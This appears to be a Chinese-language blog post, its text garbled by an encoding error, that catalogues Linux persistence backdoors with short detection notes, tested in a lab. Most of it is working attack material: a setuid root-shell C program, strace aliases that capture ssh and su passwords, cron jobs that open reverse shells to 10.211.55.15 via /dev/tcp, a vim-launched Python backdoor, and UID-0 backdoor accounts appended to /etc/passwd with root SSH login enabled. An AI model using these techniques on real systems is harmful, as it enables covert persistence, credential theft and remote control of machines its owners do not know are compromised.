<h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><p>[1].<a href="http://drops.xmd5.com/static/drops/tips-1951.html">æ¸—é€æŠ€å·§ä¹‹SSHç¯‡</a><br>[2].<a href="https://www.fr1sh.com/?post=8">ã€è½¬è½½ã€‘ä¸€æ¬¾çŸ­å°ç²¾è‡´çš„SSHåé—¨åˆ†æ</a><br>[3].<a href="https://www.einfosec.com.cn/2019/11/27/hide-openssh-version/">Hide OpenSSH version</a>â€“è§£å†³CentOSå®è·µçš„å‘<br>[4].<a href="https://www.linuxidc.com/Linux/2019-11/161565.htm">å¦‚ä½•åœ¨CentOS 8ä¸Šç¦ç”¨SELinux</a><br>[5].<a href="https://www.freebuf.com/articles/system/243862.html">LinuxåŸºç¡€è½¯ä»¶å¨èƒç–‘äº‘ï¼šä»å·²çŸ¥åˆ°â€œæœªçŸ¥â€</a><br>[6].<a href="https://www.welivesecurity.com/wp-content/uploads/2018/12/ESET-The_Dark_Side_of_the_ForSSHe.pdf">ESET-The_Dark_Side_of_the_ForSSHe.pdf</a></p>
<h3 id="æ’æŸ¥æ–¹å¼-1"><a href="#æ’æŸ¥æ–¹å¼-1" class="headerlink" title="æ’æŸ¥æ–¹å¼"></a>æ’æŸ¥æ–¹å¼</h3><p>æŸ¥MD5çœ‹æ˜¯å¦è¢«ç¯¡æ”¹ã€‚<br>CentOSï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rpm -Vf &#x2F;usr&#x2F;bin&#x2F;ssh</span><br><span class="line">rpm -Va</span><br></pre></td></tr></table></figure>
<p>Ubuntu:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo debsums --changed</span><br></pre></td></tr></table></figure>

<h2 id="PAMåé—¨"><a href="#PAMåé—¨" class="headerlink" title="PAMåé—¨"></a>PAMåé—¨</h2><p>pamåé—¨é€šå¸¸æ˜¯æŒ‡pamæºç åŒ…ä¿®æ”¹é‡ç¼–è¯‘æ›¿æ¢ã€‚<br>æ¨èé˜…è¯»:<a href="https://xz.aliyun.com/t/7902">Linux Pamåé—¨æ€»ç»“æ‹“å±•</a><br>æ€»ä½“å’Œå‰é¢OpenSSHæºç æ¤å…¥ä»£ç é‡æ–°æ‰“åŒ…çš„æ„Ÿè§‰å¾ˆåƒï¼Œè€Œä¸”æ›´åŠ ç¹çã€‚æ ¡éªŒæ–¹å¼ä¹Ÿæ˜¯å’ŒSSHæ ¡éªŒä¸€æ ·çš„ï¼Œå®˜æ–¹æ ¡éªŒã€‚</p>
<h2 id="VIMåé—¨"><a href="#VIMåé—¨" class="headerlink" title="VIMåé—¨"></a>VIMåé—¨</h2><p>å‘½ä»¤ï¼š<br><code>$(nohup vim -E -c &quot;pyfile door.py&quot;&gt; /dev/null 2&gt;&amp;1 &amp;) &amp;&amp; sleep 2 &amp;&amp; rm -f door.py</code><br>è¯•äº†è¯•æ„Ÿè§‰å¼‚å¸¸çš„ä¸å¥½ç”¨ï¼Œæ‰€ä»¥ä¹Ÿä¸å†™äº†ã€‚</p>
<h3 id="æ’æŸ¥æ–¹å¼-2"><a href="#æ’æŸ¥æ–¹å¼-2" class="headerlink" title="æ’æŸ¥æ–¹å¼"></a>æ’æŸ¥æ–¹å¼</h3><p>æ£€æµ‹å¯¹åº”vimè¿›ç¨‹å·è™šæ‹Ÿç›®å½•çš„mapæ–‡ä»¶æ˜¯å¦æœ‰pythonå­—ç¬¦ã€‚(æ˜¯å¦ä¸å¤Ÿé è°±?)</p>
<h2 id="straceè®°å½•åé—¨"><a href="#straceè®°å½•åé—¨" class="headerlink" title="straceè®°å½•åé—¨"></a>straceè®°å½•åé—¨</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># vim &#x2F;etc&#x2F;bashrc</span><br><span class="line">alias ssh&#x3D;&#39;strace -o &#x2F;tmp&#x2F;.ssh.log -e read,write,connect -s 2048 ssh&#39;</span><br><span class="line"># source &#x2F;root&#x2F;.bashrc</span><br></pre></td></tr></table></figure>
<p>ä½¿ç”¨äº†ä¸€ä¸‹æ„Ÿè§‰è¿˜è¡Œï¼Ÿä¸»è¦æ˜¯ç®€å•ï¼Œä½†logæ–‡ä»¶æœ‰ç‚¹å¤ªå¤§äº†ã€‚</p>
<p>æŒ‰ç†è¯´suå‘½ä»¤ä¹Ÿå¯ä»¥åšç±»ä¼¼æ“ä½œï¼Œä½†å®é™…ä¸è¡Œ:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">alias su&#x3D;&#39;strace -o &#x2F;tmp&#x2F;.su.log -e read,write,connect -s 2048 su&#39;</span><br></pre></td></tr></table></figure>
<p>åˆ†æå‚è§: <a href="https://xz.aliyun.com/t/2917">åˆ©ç”¨suå°å·å®ç°ä½æƒé™ç”¨æˆ·çªƒå–rootç”¨æˆ·å£ä»¤</a></p>
<h3 id="æ‰©å±•"><a href="#æ‰©å±•" class="headerlink" title="æ‰©å±•"></a>æ‰©å±•</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># vim &#x2F;etc&#x2F;bashrc</span><br><span class="line">alias ssh&#x3D;&#39;strace -o &#x2F;tmp&#x2F;.ssh.log -e read,write,connect -s 2048 ssh&#39;</span><br><span class="line"># source &#x2F;root&#x2F;.bashrc</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œæ˜¯æ”¹çš„<code>/etc/bashrc</code>ï¼Œæ”¹åŠ¨åæ‰€æœ‰æ–°æ‰“å¼€çš„bashéƒ½ä¼šç”Ÿæ•ˆã€‚<br><code>/etc</code>è·¯å¾„ä¸‹çš„é…ç½®æ–‡ä»¶å°†ä¼šåº”ç”¨åˆ°æ•´ä¸ªç³»ç»Ÿï¼Œå±äºç³»ç»Ÿçº§çš„é…ç½®ï¼Œè€Œä¿®æ”¹ç”¨æˆ·ç›®å½•ä¸‹çš„<code>.bashrc</code>åˆ™åªæ˜¯é™åˆ¶åœ¨ç”¨æˆ·åº”ç”¨ä¸Šï¼Œå±äºç”¨æˆ·çº§è®¾ç½®ã€‚</p>
<h3 id="æ’æŸ¥-3"><a href="#æ’æŸ¥-3" class="headerlink" title="æ’æŸ¥"></a>æ’æŸ¥</h3><p>ä½¿ç”¨<code>alias</code>å‘½ä»¤å³å¯å‘ç°ï¼Œæˆ–è€…å»æ’æŸ¥<code>/etc/bashrc</code>ç­‰shellé…ç½®æ–‡ä»¶ã€‚</p>
<h2 id="åŸºäºsuidè¡ç”Ÿåé—¨"><a href="#åŸºäºsuidè¡ç”Ÿåé—¨" class="headerlink" title="åŸºäºsuidè¡ç”Ÿåé—¨"></a>åŸºäºsuidè¡ç”Ÿåé—¨</h2><p>setuid: è®¾ç½®ä½¿æ–‡ä»¶åœ¨æ‰§è¡Œé˜¶æ®µå…·æœ‰æ–‡ä»¶æ‰€æœ‰è€…çš„æƒé™. å…¸å‹çš„æ–‡ä»¶æ˜¯ /usr/bin/passwd. å¦‚æœä¸€èˆ¬ç”¨æˆ·æ‰§è¡Œè¯¥æ–‡ä»¶ï¼Œ åˆ™åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œ è¯¥æ–‡ä»¶å¯ä»¥è·å¾—rootæƒé™ï¼Œ ä»è€Œå¯ä»¥æ›´æ”¹ç”¨æˆ·çš„å¯†ç .</p>
<h3 id="åŸºç¡€åé—¨ç¤ºä¾‹"><a href="#åŸºç¡€åé—¨ç¤ºä¾‹" class="headerlink" title="åŸºç¡€åé—¨ç¤ºä¾‹"></a>åŸºç¡€åé—¨ç¤ºä¾‹</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    setgid(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(argc &gt; <span class="number">1</span>)</span><br><span class="line">        execl(<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, argv[<span class="number">1</span>], <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        execl(<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;sh&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ç¼–è¯‘åŠ æƒï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc backdoor.c -o backdoor</span><br><span class="line">chmod u+s &#x2F;bin&#x2F;backdoor</span><br></pre></td></tr></table></figure>

<h2 id="å¸¸è§„crontabåå¼¹shell"><a href="#å¸¸è§„crontabåå¼¹shell" class="headerlink" title="å¸¸è§„crontabåå¼¹shell"></a>å¸¸è§„crontabåå¼¹shell</h2><p>CentOSå®šæ—¶ä»»åŠ¡å‚æ•°è¯´æ˜: </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[u111@CentOS7 cron.d]$ cat &#x2F;etc&#x2F;crontab</span><br><span class="line">SHELL&#x3D;&#x2F;bin&#x2F;bash</span><br><span class="line">PATH&#x3D;&#x2F;sbin:&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin</span><br><span class="line">MAILTO&#x3D;root</span><br><span class="line"></span><br><span class="line"># For details see man 4 crontabs</span><br><span class="line"></span><br><span class="line"># Example of job definition:</span><br><span class="line"># .---------------- minute (0 - 59)</span><br><span class="line"># |  .------------- hour (0 - 23)</span><br><span class="line"># |  |  .---------- day of month (1 - 31)</span><br><span class="line"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span><br><span class="line"># |  |  |  |  .---- day of week (0 - 6) (Sunday&#x3D;0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span><br><span class="line"># |  |  |  |  |</span><br><span class="line"># *  *  *  *  * user-name  command to be executed</span><br></pre></td></tr></table></figure>

<p>Ubuntuå®šæ—¶ä»»åŠ¡å‚æ•°è¯´æ˜:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">u111@host1:&#x2F;var&#x2F;spool&#x2F;cron$ cat &#x2F;etc&#x2F;crontab</span><br><span class="line"># &#x2F;etc&#x2F;crontab: system-wide crontab</span><br><span class="line"># Unlike any other crontab you don&#39;t have to run the &#96;crontab&#39;</span><br><span class="line"># command to install the new version when you edit this file</span><br><span class="line"># and files in &#x2F;etc&#x2F;cron.d. These files also have username fields,</span><br><span class="line"># that none of the other crontabs do.</span><br><span class="line"></span><br><span class="line">SHELL&#x3D;&#x2F;bin&#x2F;sh</span><br><span class="line">PATH&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;sbin:&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin</span><br><span class="line"></span><br><span class="line"># m h dom mon dow user	command</span><br><span class="line">17 *	* * *	root    cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.hourly</span><br><span class="line">25 6	* * *	root	test -x &#x2F;usr&#x2F;sbin&#x2F;anacron || ( cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.daily )</span><br><span class="line">47 6	* * 7	root	test -x &#x2F;usr&#x2F;sbin&#x2F;anacron || ( cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.weekly )</span><br><span class="line">52 6	1 * *	root	test -x &#x2F;usr&#x2F;sbin&#x2F;anacron || ( cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.monthly )</span><br><span class="line">#</span><br></pre></td></tr></table></figure>

<p>åŸºæœ¬æ˜¯æ²¡ä»€ä¹ˆåŒºåˆ«ï¼Œä½†ubuntuæœ‰ä¸€ä¸ªå‘ç‚¹éœ€è¦æ³¨æ„ï¼Œå°±æ˜¯<code>/bin/sh</code>æŒ‡å‘<code>dash</code>ä»è€Œä¼šå¯¼è‡´åå¼¹å¤±è´¥ã€‚<br>å‚è€ƒé˜…è¯»: <a href="https://m3lon.github.io/2019/03/18/%E8%A7%A3%E5%86%B3ubuntu-crontab%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98/">è§£å†³ubuntu crontabåå¼¹shellå¤±è´¥çš„é—®é¢˜</a></p>
<p>è¾…åŠ©å·¥å…·: <a href="https://tool.lu/crontab/">crontabæ‰§è¡Œæ—¶é—´è®¡ç®—</a></p>
<h3 id="åå¼¹ç¤ºä¾‹1"><a href="#åå¼¹ç¤ºä¾‹1" class="headerlink" title="åå¼¹ç¤ºä¾‹1"></a>åå¼¹ç¤ºä¾‹1</h3><p>å®éªŒç¯å¢ƒCentOS7<br>å­˜æ”¾åå¼¹æ–‡ä»¶<code>doorr.sh</code>:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/10.211.55.15/12323  0&gt;&amp;1</span><br></pre></td></tr></table></figure>
<p>è¾“å…¥å‘½ä»¤<code>crontab -e</code>è¿›è¡Œç¼–è¾‘ï¼ŒåŠ å…¥å†…å®¹:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">*&#x2F;3 * * * * bash &#x2F;home&#x2F;u111&#x2F;doorr.sh</span><br></pre></td></tr></table></figure>
<p><code>doorr.sh</code>è®¾ç½®äº†<code>u+x</code>ï¼Œä½†æ™®é€šç”¨æˆ·å’Œrootç”¨æˆ·çš„<code>crontab -e</code>ä¾æ—§å½±å“æƒé™ï¼Œæ™®é€šåå¼¹æ™®é€šç”¨æˆ·shellï¼Œrootçš„æ‰èƒ½åå¼¹rootã€‚å¯èƒ½æœ‰åŠæ³•åœ¨æ™®é€šç”¨æˆ·çš„crontabåå¼¹rootæƒé™shellï¼Œæš‚æ—¶æ²¡æŸ¥ã€‚</p>
<h3 id="åå¼¹ç¤ºä¾‹2"><a href="#åå¼¹ç¤ºä¾‹2" class="headerlink" title="åå¼¹ç¤ºä¾‹2"></a>åå¼¹ç¤ºä¾‹2</h3><p>å®éªŒç¯å¢ƒCentOS7<br>rootç”¨æˆ·è¾“å…¥å‘½ä»¤<code>crontab -e</code>è¿›è¡Œç¼–è¾‘ï¼ŒåŠ å…¥å†…å®¹:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">*&#x2F;1 * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.211.55.15&#x2F;12323  0&gt;&amp;1</span><br></pre></td></tr></table></figure>
<p>ä¼šåœ¨<code>/var/spool/cron</code>ç›®å½•ä¸‹ç”Ÿæˆ<code>root</code>æ–‡ä»¶ï¼Œæ³¨æ„æ–‡ä»¶æƒé™ä¸º600ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@CentOS7 cron]# pwd</span><br><span class="line">&#x2F;var&#x2F;spool&#x2F;cron</span><br><span class="line">[root@CentOS7 cron]# ll</span><br><span class="line">æ€»ç”¨é‡ 4</span><br><span class="line">-rw-------. 1 root root 58 11æœˆ  6 14:42 root</span><br></pre></td></tr></table></figure>
<p>å¦‚æœæ˜¯æ™®é€šç”¨æˆ·u111è¾“å…¥å‘½ä»¤<code>crontab -e</code>è¿›è¡Œåˆ›å»ºï¼Œåˆ™ä¼šç”Ÿæˆ<code>/var/spool/cron/u111</code>æ–‡ä»¶ã€‚</p>
<h3 id="Ubuntuåå¼¹æ³¨æ„äº‹é¡¹"><a href="#Ubuntuåå¼¹æ³¨æ„äº‹é¡¹" class="headerlink" title="Ubuntuåå¼¹æ³¨æ„äº‹é¡¹"></a>Ubuntuåå¼¹æ³¨æ„äº‹é¡¹</h3><p>å®éªŒç¯å¢ƒUbuntu18.04<br>è§£å†³æ–¹å¼1: å°†<code>/bin/sh</code>æŒ‡å‘ä»<code>dash</code>æ”¹åˆ°<code>bash</code>ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ln -s -f bash &#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure>
<p>è§£å†³æ–¹å¼2: é¿å…åœ¨cronæ–‡ä»¶é‡Œå»ä½¿ç”¨bashè¿™ä¸ªshellï¼Œå¦å¤–å»å»ºä¸€ä¸ªåå¼¹shellçš„shellè„šæœ¬æ–‡ä»¶ï¼Œç„¶ååœ¨ä»»åŠ¡è®¡åˆ’é‡Œé¢å»ç›´æ¥è°ƒç”¨è¿™ä¸ªshellè„šæœ¬æ–‡ä»¶ã€‚<br>è„šæœ¬æ–‡ä»¶<code>/root/doorr.sh</code>:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.211.55.15&#x2F;12323  0&gt;&amp;1ã€€</span><br></pre></td></tr></table></figure>
<p><code>crontab -e</code>è¿›è¡Œç¼–è¾‘ï¼ŒåŠ å…¥å†…å®¹:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">*&#x2F;1 * * * * &#x2F;root&#x2F;doorr.sh</span><br></pre></td></tr></table></figure>

<h3 id="æ’æŸ¥-4"><a href="#æ’æŸ¥-4" class="headerlink" title="æ’æŸ¥"></a>æ’æŸ¥</h3><p>ä¸€èˆ¬é€šè¿‡<code>crontab -l</code>å‘½ä»¤å³å¯æ£€æµ‹åˆ°å®šæ—¶ä»»åŠ¡åé—¨ã€‚<code>crontab -r</code>è¿›è¡Œåˆ é™¤ã€‚</p>
<h3 id="å‚è€ƒ-1"><a href="#å‚è€ƒ-1" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><p>[1].<a href="https://zhuanlan.zhihu.com/p/115082330">CentOS7å®šæ—¶ä»»åŠ¡crontabå…¥é—¨</a></p>
<h2 id="å¼€æœºå¯åŠ¨init-d"><a href="#å¼€æœºå¯åŠ¨init-d" class="headerlink" title="å¼€æœºå¯åŠ¨init.d"></a>å¼€æœºå¯åŠ¨init.d</h2><h3 id="functions"><a href="#functions" class="headerlink" title="functions"></a>functions</h3><p>å°†åé—¨ä»£ç è—åˆ°<code>/etc/rc.d/init.d/functions</code>ä¸­ã€‚<br><img src="/images/Linux%E7%BB%B4%E6%9D%83%E5%90%8E%E9%97%A8_functions.png" alt="Linuxç»´æƒåé—¨_functions"></p>
<h3 id="æ’æŸ¥-5"><a href="#æ’æŸ¥-5" class="headerlink" title="æ’æŸ¥"></a>æ’æŸ¥</h3><p>ä¸åŒçš„linuxå‘è¡Œç‰ˆå¯èƒ½æŸ¥çœ‹å¼€æœºå¯åŠ¨é¡¹çš„æ–‡ä»¶ä¸å¤§ç›¸åŒã€‚<br>Debianç³»linuxç³»ç»Ÿä¸€èˆ¬æ˜¯é€šè¿‡æŸ¥çœ‹<code>/etc/init.d</code>ç›®å½•æœ‰æ— æœ€è¿‘ä¿®æ”¹å’Œå¼‚å¸¸çš„å¼€æœºå¯åŠ¨é¡¹ã€‚<br>è€ŒRedhatç³»çš„linuxç³»ç»Ÿä¸€èˆ¬æ˜¯æŸ¥çœ‹<code>/etc/rc.d/init.d</code>æˆ–è€…<code>/etc/systemd/system</code>ç­‰ç›®å½•ã€‚</p>
<h2 id="ç¯å¢ƒå˜é‡"><a href="#ç¯å¢ƒå˜é‡" class="headerlink" title="ç¯å¢ƒå˜é‡"></a>ç¯å¢ƒå˜é‡</h2><h3 id="å‡½æ•°é‡è½½"><a href="#å‡½æ•°é‡è½½" class="headerlink" title="å‡½æ•°é‡è½½"></a>å‡½æ•°é‡è½½</h3><p>learn from: <a href="https://ixyzero.com/blog/archives/2717.html">BROOTKITä»£ç å­¦ä¹ å’ŒåŸç†åˆ†æ</a><br>å…³äºBROOTKITå¦‚ä½•å®ç°æ–‡ä»¶ã€è¿›ç¨‹ã€ç«¯å£çš„éšè—å’Œç›—å–rootç”¨æˆ·å¯†ç ï¼š<br><code>install.sh</code>å®‰è£…ç¨‹åºä¸­æœ‰ä¸€è¡Œä»£ç ï¼š<code>cp brootkit.sh /etc/profile.d/emacs.sh</code>ï¼Œè¿™ä¸€è¡Œä»£ç çš„ä½œç”¨åœ¨äºâ€”â€”ä»¥åæ¯æ¬¡æ‰“å¼€ä¸€ä¸ªç™»å½•shellçš„æ—¶å€™éƒ½ä¼šåŠ è½½è¿™ä¸ªè„šæœ¬ï¼ˆè€Œè„šæœ¬ä¸­çš„å†…å®¹æ˜¯ä¸€äº›å’Œbuiltinå‘½ä»¤é‡åçš„è‡ªå®šä¹‰functionï¼‰ï¼Œä»è€Œå®ç°Bashå‡½æ•°é‡è½½ï¼Œè¿‡æ»¤æ‰ç›¸å…³è¾“å‡ºå†…å®¹ï¼Œè¿™æ ·å°±å¯ä»¥è¾¾åˆ°è‡ªå®šä¹‰éšè—æ–‡ä»¶ã€è¿›ç¨‹ã€ç«¯å£+ç›—å–rootç”¨æˆ·å¯†ç çš„ç›®çš„ã€‚<br>ä½†æ˜¯ç®€å•çš„å‡½æ•°é‡è½½ä¼šè¢«Bashå†…å»ºçš„builtin/declare/typeset/type/set/commandç­‰å‘½ä»¤è¯†åˆ«å‡ºæ¥ï¼Œæ‰€ä»¥ï¼Œé™¤äº†ç»™ls/ps/netstatç­‰å‘½ä»¤é‡æ–°å®ç°functionä¹‹å¤–ï¼Œè¿˜éœ€è¦åšè¿›ä¸€æ­¥çš„å¤„ç†ï¼Œå³å°†è¿™äº›builtinå‘½ä»¤ä¹Ÿè¿›è¡Œé‡è½½ã€‚è¿™æ ·å°±å¯ä»¥å®ç°è‡ªå®šä¹‰éšè—æ–‡ä»¶ã€è¿›ç¨‹ã€ç«¯å£+ç›—å–rootç”¨æˆ·å¯†ç çš„åŠŸèƒ½ã€‚</p>
<p>åœ¨Bashä¸­å‘½ä»¤çš„æ‰§è¡Œéµå¾ªä¸‹é¢çš„é¡ºåºï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. è‡ªå®šä¹‰alias: alias su&#x3D;&quot;ls -l&quot;</span><br><span class="line">2. è‡ªå®šä¹‰function: function su &#123; echo &quot;Hello world&quot;; &#125;</span><br><span class="line">3. Bashå†…ç½®å‘½ä»¤builtin</span><br><span class="line">4. å¤–éƒ¨ç¨‹åº(åœ¨ç¯å¢ƒå˜é‡PATHä¸­è¿›è¡ŒæŸ¥æ‰¾)</span><br></pre></td></tr></table></figure>

<h2 id="ç®€å•ä½†å®¹æ˜“è¢«å‘ç°ç³»åˆ—"><a href="#ç®€å•ä½†å®¹æ˜“è¢«å‘ç°ç³»åˆ—" class="headerlink" title="ç®€å•ä½†å®¹æ˜“è¢«å‘ç°ç³»åˆ—"></a>ç®€å•ä½†å®¹æ˜“è¢«å‘ç°ç³»åˆ—</h2><h3 id="æ·»åŠ rootæƒé™åé—¨ç”¨æˆ·"><a href="#æ·»åŠ rootæƒé™åé—¨ç”¨æˆ·" class="headerlink" title="æ·»åŠ rootæƒé™åé—¨ç”¨æˆ·"></a>æ·»åŠ rootæƒé™åé—¨ç”¨æˆ·</h3><h4 id="Way1"><a href="#Way1" class="headerlink" title="Way1"></a>Way1</h4><p>ç”¨è„šæœ¬ç”Ÿæˆå¯†ç :</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[u111@CentOS7 ~]$ perl -e &#39;print crypt(&quot;233233&quot;,&quot;\$6\$lfeC2bwp\$&quot;) . &quot;\n&quot;&#39;</span><br><span class="line">$6$lfeC2bwp$CHZDNi3FN4Wx7CfZ4hmsQ2EobrMxnLT4ox9bPgkloSzGOXEaY8ovBOYIxMfuWU.4GTcg7rq65Mq0flISqZHE01</span><br></pre></td></tr></table></figure>

<p>åœ¨<code>/etc/passwd</code>ä¸­è¿½åŠ ç”¨æˆ·:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">backdoor:$6$lfeC2bwp$CHZDNi3FN4Wx7CfZ4hmsQ2EobrMxnLT4ox9bPgkloSzGOXEaY8ovBOYIxMfuWU.4GTcg7rq65Mq0flISqZHE01:1000:1000::&#x2F;home&#x2F;u111:&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>

<p>åŸæœ¬æˆ‘æƒ³æ·»åŠ rootç»„ï¼Œä½†æ˜¯å› ä¸ºè¿™è¾¹é™åˆ¶äº†rootæ— æ³•è¿œç¨‹sshï¼Œæ‰€ä»¥æ”¹åˆ°äº†u111ã€‚ä½†æ˜¯æ¥ä¸‹æ¥åˆå‡ºç°äº†é—®é¢˜:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[u111@CentOS7 ~]$ sudo cat &#x2F;etc&#x2F;passwd</span><br><span class="line">[sudo] u111 çš„å¯†ç ï¼š</span><br><span class="line">u111 ä¸åœ¨ sudoers æ–‡ä»¶ä¸­ã€‚æ­¤äº‹å°†è¢«æŠ¥å‘Šã€‚</span><br></pre></td></tr></table></figure>
<p>ä½†æˆ‘<code>su</code>èƒ½ç›´æ¥åˆ‡åˆ°rootæƒé™ï¼Œç„¶åå°±æ­£å¸¸äº†ï¼Œä¸å¤ªæ˜ç™½ä½†æš‚æ—¶å°±è¿™æ ·æŠŠ:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># mieea @ mieea-mbp in ~ [15:10:53]</span><br><span class="line">$ ssh backdoor@10.211.55.12</span><br><span class="line">backdoor@10.211.55.12&#39;s password:</span><br><span class="line">Last login: Mon Nov  2 15:09:14 2020 from 10.211.55.2</span><br><span class="line">[u111@CentOS7 ~]$ whoami</span><br><span class="line">u111</span><br><span class="line">[u111@CentOS7 ~]$ su</span><br><span class="line">å¯†ç ï¼š</span><br><span class="line">[root@CentOS7 u111]# whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>

<p>â€”â€”â€”â€”20201209update</p>
<p>çŠ¯äº†ä¸€ä¸ªç¼ºä¹è¿ç»´åŸºç¡€çŸ¥è¯†çš„é”™â€¦suå’Œsudoå½“ç„¶ä¸ä¸€æ ·<br>sudoç”¨ä¸äº†æ˜¯å› ä¸ºæ²¡åœ¨<code>/etc/sudoers</code>æ–‡ä»¶ä¸­é…ç½®ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">## Allow root to run any commands anywhere</span><br><span class="line">root	ALL&#x3D;(ALL) 	ALL</span><br><span class="line">u111	ALL&#x3D;(ALL) 	ALL</span><br></pre></td></tr></table></figure>

<h4 id="Way2"><a href="#Way2" class="headerlink" title="Way2"></a>Way2</h4><p>ç”¨è„šæœ¬ç”Ÿæˆå¯†ç :</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[u111@CentOS7 ~]$ perl -e &#39;print crypt(&quot;678233&quot;,&quot;\$6\$lfeC2bwp\$&quot;) . &quot;\n&quot;&#39;</span><br><span class="line">$6$lfeC2bwp$Edp4I6FXzv17d&#x2F;V2&#x2F;f2KbkFQ6b3paA21f722955psSd4t2GbWe4yzy29ftRRuW91Bbog7u42cg4tU52NIMxRm&#x2F;</span><br></pre></td></tr></table></figure>

<p>åœ¨<code>/etc/passwd</code>ä¸­è¿½åŠ ç”¨æˆ·:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">backdoor2:$6$lfeC2bwp$Edp4I6FXzv17d&#x2F;V2&#x2F;f2KbkFQ6b3paA21f722955psSd4t2GbWe4yzy29ftRRuW91Bbog7u42cg4tU52NIMxRm&#x2F;:0:0::&#x2F;root:&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>

<p>ä¸€èˆ¬éƒ½ä¼šé™åˆ¶rootçš„è¿œç¨‹sshç™»é™†ï¼Œå› æ­¤:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vi &#x2F;etc&#x2F;ssh&#x2F;sshd_config</span><br></pre></td></tr></table></figure>
<p>å°†<code>PermitRootLogin</code>çš„å€¼æ”¹æˆyesã€‚<br>å†é‡å¯sshd:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">service sshd restart</span><br></pre></td></tr></table></figure>

<p>ç™»é™†æˆåŠŸ:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># mieea @ mieea-mbp in ~ [15:33:32] C:255</span><br><span class="line">$ ssh backdoor2@10.211.55.12</span><br><span class="line">backdoor2@10.211.55.12&#39;s password:</span><br><span class="line">Last login: Mon Nov  2 15:31:59 2020 from 10.211.55.2</span><br><span class="line">[root@CentOS7 ~]# w</span><br><span class="line"> 15:34:06 up  1:12,  2 users,  load average: 0.00, 0.01, 0.01</span><br><span class="line">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line">u111     tty1                      14:44   49:10   0.00s  0.00s -bash</span><br><span class="line">backdoor pts&#x2F;0    10.211.55.2      15:34    3.00s  0.00s  0.00s w</span><br><span class="line">[root@CentOS7 ~]# whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>

